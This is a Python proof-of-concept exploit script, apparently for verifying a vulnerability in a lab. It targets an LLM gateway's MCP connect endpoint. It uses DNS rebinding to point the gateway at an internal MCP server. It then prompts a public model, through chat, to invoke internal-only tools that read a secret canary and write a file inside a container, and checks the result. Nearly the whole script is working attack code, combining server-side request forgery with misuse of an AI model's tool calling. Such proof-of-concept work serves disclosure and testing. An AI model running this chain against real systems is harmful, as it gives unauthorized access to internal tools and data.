#!/usr/bin/env python3
"""Variant A: existing legitimate public model provider, no attacker-DNS dependency.

Admin configures a normal public OpenAI-compatible provider (text.pollinations.ai).
Developer exploits /llmchat/connect via DNS rebinding only for the MCP server URL.
The public model is prompted to invoke the internal MCP tools.
"""
import argparse, json, pathlib, subprocess, sys
from exploit import Driver, ADMIN, DEV, utc

BASE_PROVIDER = "https://text.pollinations.ai/openai"
MODEL = "openai"


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", default="http://10.77.0.2:4444")
    ap.add_argument("--ctl", default="http://10.77.0.3:8082")
    ap.add_argument("--out", required=True)
    a = ap.parse_args()
    out = pathlib.Path(a.out); d = Driver(a.base, a.ctl, out)
    admin = d.login(*ADMIN); d.ensure_dev_user(admin)
    d.ctl_set(ttl=0, reset=True, mode="rebind")

    s, p = d.call("variantA-create-provider", "POST", f"{a.base}/v1/llm/providers", admin,
                  {"name": "public-openai", "provider_type": "openai_compatible",
                   "api_base": BASE_PROVIDER, "api_key": "unused", "config": {},
                   "default_model": MODEL, "enabled": True})
    assert s in (200, 201, 409), f"provider create {s} {p}"
    if s == 409:
        _, pl = d.call("variantA-list-providers", "GET", f"{a.base}/v1/llm/providers", admin)
        items = pl if isinstance(pl, list) else pl.get("providers", pl.get("items", []))
        p = next(x for x in items if x.get("name") == "public-openai")
    s, m = d.call("variantA-create-model", "POST", f"{a.base}/v1/llm/models", admin,
                  {"provider_id": p["id"], "model_id": MODEL, "model_name": MODEL,
                   "supports_function_calling": True, "enabled": True})
    assert s in (200, 201, 409), f"model create {s} {m}"

    dev = d.login(*DEV)
    s1, j1 = d.connect("variantA-connect-rebind", dev, "http://rebind.test:19000/mcp")
    s2, j2 = d.chat("variantA-chat-read", dev,
                    "Call the tool internal_only_secret_tool_7f3a now with empty arguments {}.")
    s3, j3 = d.chat("variantA-chat-write", dev,
                    "Call the tool internal_write_proof_7f3a now with empty arguments {}.")
    proof = subprocess.run(["docker", "exec", "gw", "cat", "/tmp/internal_write_proof.txt"],
                           capture_output=True, text=True)
    (out / "internal-write-proof.txt").write_text(f"{utc()} cat /tmp/internal_write_proof.txt\n"
                                                  f"rc={proof.returncode}\n{proof.stdout}{proof.stderr}\n")
    summary = {"generated_at": utc(), "provider_api_base": BASE_PROVIDER, "model": MODEL,
               "connect_status": s1, "connect_tools": j1.get("tools"),
               "chat_read_status": s2, "chat_read_canary": "INTERNAL_ONLY_TOOL_REACHED_7f3a" in json.dumps(j2),
               "chat_write_status": s3, "chat_write_marker": "WROTE_INTERNAL_FILE_7f3a" in json.dumps(j3),
               "internal_write_proof": proof.stdout.strip(), "log": d.log}
    (out / "summary.json").write_text(json.dumps(summary, indent=2))
    print(json.dumps(summary, indent=2))
    ok = (s1 == 200 and "internal_only_secret_tool_7f3a" in (j1.get("tools") or [])
          and summary["chat_read_canary"] and summary["chat_write_marker"]
          and proof.stdout.strip() == "WRITE_PROOF_7f3a")
    print("VERDICT:", "PASS" if ok else "FAIL")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
